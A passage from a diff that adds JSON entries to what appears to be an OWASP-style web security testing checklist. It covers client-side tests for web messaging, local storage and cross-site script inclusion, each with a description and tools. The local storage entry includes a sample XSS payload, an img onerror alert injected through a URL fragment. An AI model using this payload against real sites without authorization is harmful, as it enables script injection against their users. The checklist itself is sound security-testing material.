+    "tools": "Burp Proxy, Chrome, ZAP, WebSocket Client"
+  },
+  {
+    "code": "OTG-CLIENT-011",
+    "section": "Client Side Testing",
+    "name": "Test Web Messaging",
+    "description": "Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains",
+    "tools": "Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-012",
+    "section": "Client Side Testing",
+    "name": "Test Local Storage",
+    "description": "Determine whether the website is storing sensitive data in the storage. XSS in localstorage \nhttp://server/StoragePOC.html#<img src=x onerror=alert(1)>",
+    "tools": "Chrome, Firebug, Burp Proxy, ZAP"
+  },
+  {
+    "code": "OTG-CLIENT-013",
+    "section": "Client Side Testing",
+    "name": "Testing for Cross Site Script Inclusion",
+    "description": "Locate sensitive data across the system.\nAssess the leakage of sensitive data through various techniques.",
+    "tools": "Veit Hailperin’s Burp proxy plugin"
+  }
+]
